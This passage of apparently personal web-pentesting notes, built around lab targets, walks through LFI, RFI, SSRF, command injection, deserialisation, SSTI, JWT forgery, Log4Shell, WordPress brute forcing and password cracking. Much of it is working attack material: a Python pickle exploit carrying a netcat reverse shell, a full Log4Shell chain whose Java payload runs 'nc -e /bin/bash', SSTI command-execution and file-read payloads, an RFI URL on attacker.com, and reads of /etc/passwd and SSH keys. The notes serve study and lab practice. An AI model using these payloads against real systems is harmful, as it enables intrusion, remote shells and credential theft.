This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are. Then, we include a PHP code into the session and finally call the file via LFI. PHP stores session data in files within the system in different locations based on the configuration. 

**COMMON PHP STORES:**

> - `c:\Windows\Temp`
> - `/tmp/`
> - `/var/lib/php5`
> - `/var/lib/php/session`

PHP by default stores sessions with the following format `sess_$SESSIONID` in the `/tmp/` folder. So for example if the webserver logs your session id even if you are not logged in, i.e attempted login with username. The developer still records the session id for username entries **even if they aren't successful logging in**.

Then we can abuse this knowing the `sess_$SESSIONID` format, entering `code` as a username and login to have it be recorded then grabbing our session id through the browser. Finally using LFI to navigate to the file in the `/tmp` folder to launch our code.

**ABUSE PHP SESSIONS:**

> - `<?php phpinfo();?>` into Username field
> - `../../../../tmp/sess_$SESSIONID` to load the file and run the code


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## PHP-Filters

Attempting PHP filters in order to see if we can make the website encode base64 and so forth. By testing this we have avenues for different vectors but *php filters are usually disabled by default*

**NOTE:**

> - The following can be used in a `get` parameter if you find a page that calls on an object such as `http://192.168.187.72:8593/index.php?book=list`
> - The PHP filter wouldreplace the `list` variable


**PHP FILTER:**

Sometimes when using PHP filters, it is important to also encode the entry in order to have the correct resource be reflected onto the page.

The PHP filter wrapper is used in LFI to read the actual PHP page content. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we can use the PHP filter to display the content of PHP files in other encoding formats such as **base64** or **ROT13**.

**PHP DATA:**

Also able to include data or text to the page using `data://text/plain;base64,$ENCODED` and thereby producing plain text on the web page. It can also include **base64 encoded data, images and further LFI exploits**.\
This also allows us to use `PHP CODE` on the page

> - `echo "hello world" | base64` Produce: aGVsbG8gd29ybGQK
> - `http://10.10.119.34/index.php?err=data://text/plain;base64,aGVsbG8gd29ybGQK`

**EXAMPLE TESTING:**

> `http://10.10.119.34/index.php?err=error.txt` LFI target
> `http://10.10.119.34/index.php?err=/etc/passwd` to LFI into passwd file
> `10.10.119.34/index.php?err=php://filter/resource=/etc/passwd` php filter wrapper for the resource
> `10.10.119.34/index.php?err=php://filter/convert.base64-encode/resource=/etc/passwd` base64-encode used with php filter, will produce the file details in base64


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## RFI

Remote-File-Inclusion

Technique to `include` remote files and into a vulnerable application. Similar to Local File Inclusion; this is due to improperly sanitized user inputs and **allowing attacker to inject an external URL** into `include` function.\
One requirement is that `allow_url_fopen` is required to be switched *on*

RFI is dangerous as it allows the potential lead on to Remote Command Execution on the servers. Other consequences include;

> - Sensitive info disclosure
> - XSS
> - DoS

An **external server** must communicate with the target application server for a successful RFI attack. The malicious files are hosted on the attackers external server and injected into the `include` function via HTTP requests.

**EXAMPLE:**

> - `http://target.site/index.php?lang=http://attacker.com/maliciousCodeToDownload.txt`
> - injecting the malicious code into the include function and the url points to the attackers website and downloads a file.
> - Web server will send a `GET` request and include the remote file into `include` function to execute the PHP file within the page. Thus sending the execution content to the attacker

**RFI `Get` PARAMETER**

> - Setup netcat listener with `nc -lvnp 4444`
> - From webpage, attempt to call back to your own pc with any file name ie. `http://{your ip addres}/test.php` and insert in the get paramenter:
> - `http://192.168.187.72:8593/index.php?book=http://{your ip addres}/test.php` noting that the test.php doesn't actually exist, we are just looking for the callback to show in listener
> - Check your listener and see if the target webservice has attempted to call on your system. 

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SSRF

Server-Side-Request-Forgery

SSRF is a vulnerability that allows the attacker to make *further* HTTP requests through the server; allowing to communicate with any internal services on the server's network that are generally protected by firewalls.\
To provide a clearer picture; while the attacker cannot access the database or other services that the webserver uses, if there is a SSRF vulnerability then the attacker can **use the webserver** to make those requests on his behalf.

The service, i.e database, thinks it is the website making the request and sends the data through; meanwhile the attacker has only interacted with the webserver on the port 80 or 443 **that the firewall allowed**

The impact of this type of vulnerability:
- Access to unauthorised areas
- Access to customer or Org data
- Ability to scale the internal network
- Reveal authentication tokens and credentials

**VULNERABLE CODE EXAMPLE:**

```php
# Takes URL for an image and webpage displays for you.
# Checks if information sent in 'URL' parameter, makes request to user-submitted URL.
# No Checks done, Attackers have full control of URL and can make GET Requests to the internet OR internally on the server as well.

<?php

if (isset($_GET['url']))

{
	$url = $_GET['url'];
	$image = fopen($url, 'rb');
	header("Content-Type: image/png");
	fpassthru($image);

}
```

```python
# Takes URL parameter
# Makes request to user-submitted URL
# No Sanitisation

from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

@app.route("/")
def start():
	url = request.args.get("id")
	r = requests.head(url, timeout=2.000)
	return render_template("index.html", result = r.content)

if __name__ == "__main__":
	app.run(host = '0.0.0.0')

```

**COMMON PAYLOADS:**

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-exploitation-via-url-scheme)

> - **Port Scanning**
> - `http://localhost:3306` Check for MySQL DB
> - `http://[::]:3306` IPv6 Format: PHP Sanitisation is applied to localhost or 127.0.0.1
> - `http://:::3306` IPv6 Format: flask/Django interpreter rejects brackets 
> - `http://2130706433:3306` Decimal IP:port
> - `http://0x7f000001:3306` Hexadecimal IP:port

```bash
# Port Scanning bash script

for x in {1..65535};
	do cmd=$(curl -so /dev/null http://10.10.171.79:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
	if [ $cmd != 1045 ]; then
		echo "Open port: $x"
	fi
done
```

> - **File Reading**
> - `file:///etc/passwd` for linux

**Example of changing GET Request with a site request to user data:**


![](https://i.imgur.com/LLVjSV1.png)

**Example of directory traversal to still get to the user info:**

![](https://i.imgur.com/NQ2Pzc8.png)


**Example of using `&x=` stop remaining path from being appended:**

![](https://i.imgur.com/SJoWPj7.png)

> - Using the `&x=` is useful for when you want to force the site to retrieve the info from the directory that you specify as you remove the input from the server appending the resource.
> - `https://website.thm/item/2?server=api` is telling server to request `https://api.website.thm/api/item?id=2`
> - `/item/2?` = `/api/item?id=2`
> - Changing it to `https://website.thm/item/2?server=server.website.thm/flag?id=9&x=` will force the site to look for `server.website.thm/flag?id=9` only and not append the full request `https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2`

**Four common places to spot SSRF Vulnerabilities**

> - When URL is used in parameter in the address bar
  
![](https://i.imgur.com/2q3Q1Zm.png)

> - Field hidden in form

![](https://i.imgur.com/knQzhVS.png)

> - Partial URL such as just the hostname
  
![](https://i.imgur.com/fCHXI1Q.png)
    
> - Only path of the URL
  
![](https://i.imgur.com/HXBQgxC.png)

**Exampe of changing a avatar account setting to exploit a SSRF:**

  You might access a page resource where you can choose a new avatar. By inspecting the source code you might uncover path traversal.

  ```php
  <div class="row text-center">
      <div class="avatar-image" style="background-image: url('/assets/avatars/1.png')"></div>
  </div>
  ```
  
  If you were able to enumerate to some private path you know about you might set the value of this URL to 'private' and then when you load the changed avatar, this might call on INFO from a private directory.



**Blind SSRF**

Where no output is produced to trial and error, you will need to use an external HTTP logging tool to monitor requests such as requestbin.com, your personal HTTP server or Burp Suites collaborator client


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## CSRF

Cross-site-request-forgery

**USEFUL COMMANDS:**

Using the automated tool to scan for CSRF

`xsrfprobe -u $RHOST/$ENDPOINT`

[Back to Top](#table-of-contents)


## Command-Injection-Vulnerabilities

Abuse of an applications behaviour to execute commands on the OS using the **same privileges** that the application on a device is running with.

There are two way you can typically detect if *command injection* has been successful:
1. Blind - No direct output, will need to investigate if successful
2. Verbose - Direct output, you will know if successful

**Tools & Methods to verify command injection was successful:**

  **Ping** and **Sleep**:\
  Blind injections are difficult without any feedback so the idea would be to create some kind of *tell* that signals that you have been successful.\
  Tools such as **ping** and **sleep** are significant payloads to test with; for example the application will hang for x seconds depending on how many pings you have specified.

  The **>** **Operator**:\
  Another method is using the **>** redirection operators to feed output into a document. The creation or amendment on that document will signal the successful; for example having the command `whoami` executed and the output directed into a file.

  **Curl**\
  Great way to test for command injection. This is because you are able to use `curl` to deliver data to and from an application in your payload. For example `curl http://{vulnerable.app}/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`


|                                           | Desciption                                                     |
| :---------------------------------------- | :------------------------------------------------------------- |
| @ **Useful Payloads - Linux**             | ---                                                            |
| `whoami`                                  | What user is the application running under                     |
| `ls`                                      | List contents of directory. May find sensitive data or folders |
| `ping`                                    | Invoke application to hang, useful for blind injection         |
| `sleep`                                   | As above, useful when machine does not have `ping` installed   |
| `nc`                                      | Netcat used to spawn reverse shell onto the application        |
|                                           |
| @ **Useful Payloads - Windows**           | ---                                                            |
| `whoami`                                  | What user is the application running under                     |
| `dir`                                     | List contents of directory. May find sensitive data or folders |
| `ping`                                    | Invoke application to hang, useful for blind injection         |
| `timeout`                                 | As above, useful when machine does not have `ping` installed   |
|                                           |
| ========================================= | =========================================                      |

**How to prevent Command Injection:**\
It can be prevented in a variety of ways. From minimal use of potentially dangerous **functions** or libraries in programming languages to **filtering input** without relying on a user's input.

  **Vulnerable Functions**

   - > `Exec`
   - > `Passthru`
   - > `System`

  **Input Sanitisation**

  - > Specifying what type of characters are accepted within the field. For example if expecting numbers, then filtering out words and special characters such as `/, >, &` and so forth.
  - > Be wary of filtering and the work arounds; for example if you are stripping `?` from entries, one way to get around this is using the hexidecimal format allowing the  payload to still get through `$payload=/x2f/x65/x74/x63/x2f/x70/x61/x73/x73/x77/x64` 

**Good resource for a Payload Cheatsheet on Command Injection:**

  - > [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)

[Back to Top](#table-of-contents)

---

## Insecure-Deserialisation

Simply, insecure deserialisation is replacing data processed by an application with malicious code; allowing for Denial of Service to Remote Code Execution.

This malicious code leverages the legitimate serialisation and deserialisation process used by web apps.\
This exploitation is on a case by case basis and has no set framewokr or reliable tool.  Attackers need to have a good understanding of the inner-workings of the ToE.

This exploit is also only as dangerous as the attackers **skill level** in relation to the extent of their exploit and the value of the data exposed.

**What is vulnerable:**

Any application that stores or fetches data where theere a no validations or integrity checks in place for the data queried or retained.\
Normally consists of the following:

* E-Commerce sites
* Forums
* API's
* Application Runtimes (tomcat, jenkins, jboss etc.)

---

**CODE EXECUTION:**

On a case by case basis - able to amend a cookie once logged in and base64 encode a script to produce a remote shell on the web app.\
To explain further, it requires the webpage to **trust any encoded** data.

The particular example could be that you click on a link (as an authenticated user) and it creates an encoded cookie; when visiting a different part of the page afterwards, the **cookie is decoded and deserialised (run)**.

**Usage:** Running this code will produce a base64-encoded payload thant you can use to set in your browser cookie; refreshing the webpage will run the payload.

**Example of below code being ran**

![Example of below code being ran](https://i.imgur.com/pbAHhGP.png)

Be mindful that the payload requires that you setup a listening on your device to capture the reverse shell.

```py
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.4.42.21 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```
**Example of encoded payload being set, ready to be deserialised**

![](https://i.imgur.com/N9CHOWc.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## File-Upload-Filtering

### Bypassing-Client-side-filtering

Client-side filtering is fairly easy to overcome as the validation happens on the users' browser and not in the server. As such bypassing this mechanism is fairly easy.\
This method of filtering is also the weakest line of defense.

1. Turn of javascript: if the webapp filtering relies on javascript then it could be possible to turn it off and see if you have *basic functionality* to still operate afterwards
2. Intercept and Modify via Burp Suite: strip the javascript filter before it has a chance to run
3. Intercept and Modify File Upload: intercept the file upload **after** is has been accepted by the filter but **before** being transmitted
4. Send Direct to File Upload: Avoid the webpage filtering by sending the file directly with `curl`. Syntax similar to `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
   * Would require to first intercept and **successful upload** to see parameters being used, then modify the above syntax

**Example of modifying the upload submitted**

![](https://i.imgur.com/eS9CQMa.png)

  Successful upload and bypass of the client-side filtering. With this, we have uploaded a reverse shell that we can access if we find the location the upload was stored.

![](https://i.imgur.com/AQ7pq6K.png)

|                                                                                 | Desciption                                                             |
| :------------------------------------------------------------------------------ | :--------------------------------------------------------------------- |
| @ **Direct File Upload Syntax**                                                 | ---                                                                    |
| `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>` | first intercept and **successful upload** to see parameters being used |
|                                                                                 |
| =========================================                                       | =========================================                              |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Bypassing-Server-side-filtering

**File Extensions**

  When your uploads are being scanned and compared to a blacklist or whitelist, often you won't have access to the source code meaning you aren't able to find out what is in the\
  black list and white list without **brute forcing**.

  For example, the website might accept {file}.png as an acceptable upload but it won't accept {file}.php.

  So you would need to see what it does accept:

  * **.PHP is acceptable as**: .php, .phtm, .phar, .php3, .php4, .php5, .php7, .phps, .php-s, .pht etc..

  So while one site might filter .php but then forget to filter for the outliers as above; this would allow us to still upload file.phar or similar and run a reverse shell script.

**Magic Numbers**

  Magic numbers are more accurate identifiers of files. The magic number of a file is a *string index of hex digits* and is always the very first thing in a file.\
  Knowing this, magic numbers can be used to validate file uploads simply by reading those first few bytes and comparing them against either a whitelist or a blacklist.

  **This technique is very effective against php webservers** and sometimes fails against other types of webserver.
  
  List of file signatures: [Wiki File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)

  The above list can show us several possible magic numbers of JPEG files and such. Picking a hexidecimal value for the file JPEG and then we can use this magic number\

  **To Demonstrate:**

  * `file {shellcode}.php` will show clearly that the file is php
  * Open up the {shellcode}.php and add 4 *random* characters in the first line such as "AAAA" (The characters do not matter)
  * Now open the document with `hexeditor` or any tool that will allow you to see and edit the file as hex. 
  * Looking at the document, all 4 AAAA characters will be represented in their hexidecimal format `41 41 41 41`
  * Now change these 4 hexidecimal values to one of the file signatures representing JPEG from [Wiki File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * `file {shellcode}.php` will show clearly that the file is JPEG

**Webapp Testing Methodology**

  Step by step process:

  1. Using Wappalyzer or checking the headers in burpsuite; determine the programming language and framework etc as part of your enumeration.
  2. Finding the upload page, as well as inspecting the source code; check for any client-side filter that may be happening
  3. Attempt innocent file and see if successful
  4. Check if the successful file is embedded within the webapp and do we have access to this file
  5. Using gobuster/dirsearch or feroxbuster, spider the webapp and understand all the paths and likely locations where file might be saved
  6. If we can find the file, then we can proceed to attempting malicious code instead of innocent file upload.

  Determine why malicious file was blocked:

  1. Check if its because of the extension being rejected i.e is it only accepting .jpg, .png etc..
  2. Is it a blacklist of extensions such as blocking .php or .js and so forth, or a whitelist only accepting .jpg files and such.
  3. Is it blocking the magic number? hexedit the file and make it appear as if its a .jpeg and see if it works
  4. Is it blocking the MIME type? use burpsuite to edit your upload and change the item to text/x-php or whatever instead of it being image/jpg.
  5. Check the file length, is the file too big or small and is it rejecting the larger code-based file due to size.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## JWT

JSON-WEB-TOKEN

JSON web token contains 3 parts: 

- **HEADER** in the format `{ "alg": "HS256", "typ": "JWT" }`
- **PAYLOAD** The access given to a certain user
- **SIGNATURE** Integrity checking while transferring token from user to server, and back. Encrypted with same algorithm as **header**

These 3 parts are then `base64` encoded and separated with a *dot*

If used properly then this is a secure method of authentication however a lot of devs misconfigure their system leaving it vulnerable.

Methods to exploit:

1. Bruteforce to find the `secret` for encrypting the JWT token
2. Login as lower priv user to receive JWT, decode the token and edit the **header** to `set alg value to none`; meaning we set algorithm = none for the encryption and not require for the `secret` any more

Typically the second point is not common but when dealing with misconfigurations; it could happen to anyone.

So looking at the below JWT, by decoding it from base64 we have found the token details.

**NONE SECRET:**

> - **Authorization**: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2Mzg3OTEyOTIsImlhdCI6MTYzODc5MDk5MiwibmJmIjoxNjM4NzkwOTkyLCJpZGVudGl0eSI6MX0.UEOo-H2jyB5SfWSQSIkjvu8zN7ERywwkfoW4LgoiNXs
> - **Header**: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 Decrypted: {"typ":"JWT","alg":"HS256"}
> - **Payload**: eyJleHAiOjE2Mzg3OTEyOTIsImlhdCI6MTYzODc5MDk5MiwibmJmIjoxNjM4NzkwOTkyLCJpZGVudGl0eSI6MX0 Decrypted: {"exp":1638791292,"iat":1638790992,"nbf":1638790992,"identity":1}
> - **Signature**: Encrypted but a bunch of gibberish

Changing and encoding our own JWT:

> - **Header Changed** : {"typ":"JWT","alg":"$none$"} 
> - **Payload Changed**: {"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":$2$} i.e changing the value to get a different user such as admin might be id:0
> - **Signature**: Removed, as per above we have removed the encryption so this is not required
> - **JWT**: eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.

Note that we removed signature but still ended with dot(.)

**HS256 SECRET:**

When you are not able to remove the secret with `alg:none` then you will need to either do a manual or automatic method of exploitation.

When you see a JWT token with the headers: `{ "alg": "RS256", "typ": "JWT" }` then we know $RS256$ is not vulnerable to any exploits as the private key is held on the server. However if we are able to change it to $HS256$ then we can look at using the public key for authentication as the server normally leaves the public key lying around. This leads to the attacker being able to sign a new secret.

Note: due to JWT often expiring; there is no real way to guarantee that finding the public key is possible and keep the data portion of the JWT consistent.

```
cat $FILE: load output then proceed with piped instructions
xxd -p: turn context to HEX
tr -d: remove NEWLINES
```

1. Decode & Encode 'alg' header to match `HS256` or `none`
2. Obtain public key i.e `$RHOST/public.pem` to download
3. `cat $PUBLICpem | xxd -p | tr-d "\\n"` HEX Conversion
4. `echo "$HEADER.$PAYLOAD" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$HEX` Sign HS256 Key
5. `python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$KEY')).replace('=','')\")"` Decode Key into Binary AND THEN encode to base64


**BRUTEFORCING SECERET:**

It is possible to brute force the secret using a tool called `jwt-cracker` however **this could take significant amount of time to crack depending on length of password and size of alphabet you use.**

```
$TOKEN: full HS256 token string
$ALPHABET: the alphabet to use i.e default "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
$LENGTH: max length of string during brute force.
```

> `jwt-cracker $TOKEN [$ALPHABET] [$LENGTH]`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SSTI

Server-Side Template Injection

Sometimes developer use static HTML pages that sets a username parameter, that would always be set to the current user's username.\
This vulnerability has the potential to lead to ranging exploits from XSS to RCE.

Normally tested when the website reflects your input such as your name then is reproduced with "Hello {your name}". By using the below test, if the webapp is vulnerable to SSTI then `{{2+2}}` should output "Hello 4"

**USEFUL COMMANDS:**

> - `{{2+2}}` Testing for SSTI
> - `{{ ''.__class__.__mro__[2].__subclasses__()[40]()($FILEpath).read()}}` File Read i.e /home/user/.ssh/id_rsa
> - `{{config.__class__.__init__.__globals__['os'].popen("$COMMAND").read()}}` Command Execution i.e "cat /etc/passwd"


**TPLMAP:**

TPLmap is a automated tool to investigate and test against SSTI. The tool ranges from preliminary checks to pseudo shells (depending if command executions are found).

Note: ensure all dependencies are installed such as yaml.

> - `/opt/tplmap/tplmap.py -u $RHOST -d '$PARAMETER'` POST
> - `/opt/tplmap/tplmap.py -u $RHOST/?$PARAMETER`  GET
> - `/opt/tplmap/tplmap.py -u $RHOST -d '$PARAMETER' --os-cmd "$COMMAND"` RCE

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Log4Shell

Log4j is a depency that is utilised by a large amount of different platforms in order to log data. This depency is widespread and prior to the most recent patches; allowed the data submitted to be logged **and executed** by the database. This poses as a significant risk due to the attack surface being across so many different applications (wide-attack surface) and that the actual exploit is simplistic and easily verifiable.

Due to the simple nature of the exploit, and due to the length of time it takes for updates to transfer downstream among enterprises and businesses; this particular exploit will be seen for years to come.

**Note:**

> - Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language.

```powershell
#OPTIONS
    $RHOST                           :Remote IP address
    $RPORT                           :Remote Port
    $LHOST                           :Local IP address
    $LPORT                           :Local Port

#SYNTAX
    ${jndi:ldap://$RHOST:$RPORT}

#USAGE - Confirm Exploit (No Reverse Shell)
    # $          :Example of a webpage leading to the resource e.g 'cores' that accepts parameters {}
    # '?get='    :Setting parameter at 'cores' and calling on jndi syntax
    # Using Curl :Require quotes and 'escape' characters at the $\{jindi and at the $RPORT\ so that bash doesn't act up due to thinking its a variable
    curl 'http://$VICTIM.com/$example/$admin/$cores?get=$\{jndi:ldap://$RHOST:$RPORT\}'
    Or alternative, webbrowser: http://$VICTIM.com/$example/$admin/$cores?get=${jndi:ldap://$RHOST:$RPORT}

#SETUP PAYLOAD
    #Refer code for payload
    cd /opt/marshalsec
    sudo javac Exploit.java

#Terminal 1: HOST PAYLOAD
    cd /opt/marshalsec
    sudo python3 -m http.server 8000

#Terminal 2: LDAP REFERRAL SERVER
    cd /opt/marshalsec
    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$LHOST:8000/#Exploit"

#Terminal 3: NC LISTENER
    #The port our payload will be connecting to i.e 4444
    nc -lvnp $LPORT

#EXPLOIT
    #Note, Port has changed to #LDAP port, 1389
    curl 'http://$VICTIM.com/$example/$admin/$cores?get=$\{jndi:ldap://$RHOST:1389\}'
    curl 'http://10.10.70.74:8983/solr/admin/cores?get=$\{jndi:ldap://10.4.42.21:1389/Exploit\}'
```

In order to fully exploit, we need to execute arbitrary code crafted within Java. The following code is an example and the payload can be interchanged however in this case; the example is reflective of a system that has **netcat** installed.

```powershell
#Reminder to set $RHOST to your attacker IP and $RPORT to your attacker port, this is a payload so the 'remote host' is the external host from where this is run from (i.e the victim)
#Exploit.java
#$RPORT is where this payload will connect to our host, i.e 4444
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash $RHOST $RPORT");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

The above code does require some setup and then we can use the exploit with the payload.

**Example**

> LDAP server hosting and listening on port 1389 **while making a call to our host and downloading Exploit** from port 8000

![](https://i.imgur.com/RwrOMQO.png)

> HTTP server, serving the exploit up on port 8000

![](https://i.imgur.com/Nf5zND8.png)

> HTTP request to the vulnerability and triggering our exploit/payload

![](https://i.imgur.com/ITBOivD.png)

> Netcat listener catches shell and provides terminal

![](https://i.imgur.com/Bydt7ut.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Wordpress

Wordpress is a common web framework that is used. Knowing the framework and the version, as well as the potential vulnerabilities, will make it so that when you do eventually encounter wordpress then you will have an idea of what enumeration you can do.

**WP-SCAN**

This is a great tool to scan Wordpress and enumerate some info such as version, configuration and textfiles. Additionally this tool can also perform bruteforcing for specificly enabled configurations.

```powershell
#OPTIONS
    -e     : Leave blank for all, otherwise target specific enumeration vp (plugins),u (users)
    $RHOST : Target IP
    $USER  : User i.e commonly 'Admin'

#SCANNING
    wpscan --url 10.10.74.91/blog -e vp,u

#BRUTEFORCE - XMLRPC
    wpscan --url http://$RHOST/blog --usernames $USER --password $WORDlist --max-threads 50
    wpscan --url 10.10.227.161 --usernames Elliot --passwords ~/Downloads/fsocity-sorted.dic --max-threads 50 --wp-content-dir wp-login
```

**Exploiting Webservice**

> -  Common location for Theme content

After successfully breaking the webservice, the following is common entries to escalate to the next step.

![](https://i.imgur.com/n9FPcRP.png)

Having a look at the theme we are able to successfully place a reverse shell onto the edited theme and then navigate to the shell to get a call back.

![](https://i.imgur.com/Ma0zJDh.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Jenkins

Jenkins is another widely used web framework that we can exploit once we gain access to the admin page.

![](https://i.imgur.com/halVlL7.png)

![](https://i.imgur.com/wg23Geq.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# SYSTEM-ATTACKS

## Malware

Malware is classed by *its *behavior* and not solely on the features it provides.

| **Malware Class**    | Description                                                                                          |
| :------------------- | :--------------------------------------------------------------------------------------------------- |
| Virus                | Spreads without intentional action by user, normally attached to normal files and code ran when used |
| Trojan Horses        | Embedded inside harmless-like files, devastating if able to get Shell                                |
| Rootkit              | Cleverly hides itself, allows attacker to access the machine without being noticed                   |
| Bootkit              | Circumvents OS protection mechanisms by starting first before the operating system                   |
| Backdoors            | Two components: Backdoor Server (on victim machine) & Backdoor Client (on attacker machine)          |
| Adware               | Shows advertisements                                                                                 |
| Spyware              | Spies and collects info such as passwords, visited sites, OS installed on machine                    |
| Greyware             | Indicates software that doesn't fall under a specific category. It can be both spyware and adware    |
| Dialer               | Dial numbers on dial-up connections in order money from victim's phone bill.                         |
| Key-logger           | Records keystrokes, records window name (active), sends details to a log server                      |
| Botnet               | Small software bundles across many machines to use towards DDoS or spamming.                         |
| Ransomware           | Encrypts computers, files or info in order to randsom the data back to the victim                    |
| Data-Stealin Malware | Targeted & Tailored malware with the intention to steal the most important data and send it back     |
| Worm                 | Spread across the network by exploiting OS and software vulnerabilities                              |


**BACKDOORS:**

  - Firewalls can be used to stop backdoors by blocking *incoming *connections* from the internet to an internal network
  - Incoming connections will often raise flags
  - Thus, being sneaky is better; **connect-back** backdoor is a common mechanism to bypass firewalls
    - Roles are flipped, instead of the backdoor server being on the victim machine; its run on the attacker machine
    - The victim machine then runs the backdoor client and pre-emptively makes the *outbound connection* 
    - Normally be run on an acceptable port like Port 80, firewalls cannot tell the difference between a backdoor connecting back and the user surfing the web

**KEY-LOGGERS:**

  - Same restrictions as Backdoors, thus it needs to be clever and disguise as real traffic
  - Hardware keylogger is a physical device that can sit between the keyboard and the computer. Requires the attacker to place and retrieve the device
  - Rootkit keylogger hijacks the OS API's to record. 

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Password-Attacks

**TYPES:**

- Brute Force: Test each and every input value, slowing increasing in number of characters over time
- Dictionary: Test of common passwords or best guesses

**TOOLS:**

- **John the Ripper**: Mounts brute force & dictionary based attacks with some clever rules and options available.
  - Fast due to the high use of parallelization and cracking strategies
  - **Rainbow Tables**:  Table containing links between results of a run of one hashing function and another
  - **Ophcrack**: Tool to perform rainbow cracking aimed at **windows password recovery**

Additionally it is important to understand what type of hashes you are looking at as well so that you can understand the format.

> [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)


**Mitigation for Password attacks**:

- > **Password Policy**: Enforces minimum complexity constraints on the passwords set by the user.
- > **Account Lockout**: Locks the account after a certain number of failed attempts.
- > **Throttling Authentication Attempts**: Delays the response to a login attempt. A couple of seconds of delay is tolerable for someone who knows the password, but they can severely hinder automated tools.
- > **Using CAPTCHA**: Requires solving a question difficult for machines. It works well if the login page is via a graphical user interface (GUI). (Note that CAPTCHA stands for Completely Automated Public Turing test to tell Computers and Humans Apart.)
- > Requiring the use of a public certificate for authentication. This approach works well with SSH, for instance.
- > **Two-Factor Authentication**: Ask the user to provide a code available via other means, such as email, smartphone app or SMS.
- > There are many other approaches that are more sophisticated or might require some established knowledge about the user, such as IP-based geolocation.

------------------------------------------------------------------------------------------------------------------------------------------------------

### John-The-Ripper

Relational Tools:\
[[#Hashcat]], [[#Hashes-Passwords]], [[#Linux-Hashes]], [[#Windows-Hashes]],  [[#SSH-Private-Public-Keys]], [[#Shell-SSH]]

|                                                                      | Descriptions                                                                                                    |
|:-------------------------------------------------------------------- |:--------------------------------------------------------------------------------------------------------------- |
| @ **John Basic Use**                                                 | ---                                                                                                             |
| `john $FILE`                                                         | Run with defaults on hashes.txt file                                                                            |
|                                                                      |                                                                                                                 |
| @ **Unshadow Syntax**                                                | ---                                                                                                             |
| `unshadow $FILEpasswd $FILEshadow > $FILE`                           | Combining two files, usernames and password hashes                                                              |
|                                                                      |                                                                                                                 |
| @ **John Wordlist Attack**                                           | ---                                                                                                             |
| `john --wordlist=$WORDLIST --rules $HASHES`                          |                                                                                                                 |
| `john --format=$ENCRYPTIONMODE`                                      | pdf, zip, crypt,RAW-MD5 Important to specify what type of hash you are cracking                                 |
|                                                                      |                                                                                                                 |
| @ **John Bruteforce Attack**                                         | ---                                                                                                             |
| `john --format=$ENCRYPTIONMODE --incremental --users=$USERS $HASHES` | Brute force `--incremental`, `-users` to specify target users                                                   |
|                                                                      |                                                                                                                 |
| @ **Options**                                                        | ---                                                                                                             |
| `--format=$ENCRYPTIONMODE`                                           | select formatting                                                                                               |
| `--list=formats`                                                     | Check encryption formats for *john the ripper*                                                                  |
| `--incremental`                                                      | Indicate for brute forcing                                                                                      |
| `--list=formats`                                                     | Check encryption formats for *john the ripper*                                                                  |
| `--show $HASHES`                                                     | Show cracked passwords, used `--show=left` to show the passwords still *left* to crack                          |
| `--users=$USER1,$USER2`                                              | Dictate specific users you want to crack or target list of users                                                |
| `--wordlist=$WORDLIST`                                               | Specify wordlist to use and test                                                                                |
| `--rules $HASHES`                                                    | Mangling, Adds significant time but applies so mangling of password tests to include cat,c@t,caT. cAT,cat12 etc |

**NOTES:**

> - In most UNIX systems, after gaining access and you can exfiltrate password files in following locations > `/etc/passwd` containing *user accounts* > `/etc/shadow` containing password *hashes*
> - **John** requires both usernames and hashes to be in the same file
> - Using `-wordlist` with empty string forces *john* to the default wordlist if nothing else is specified

[Back to Top](#table-of-contents)

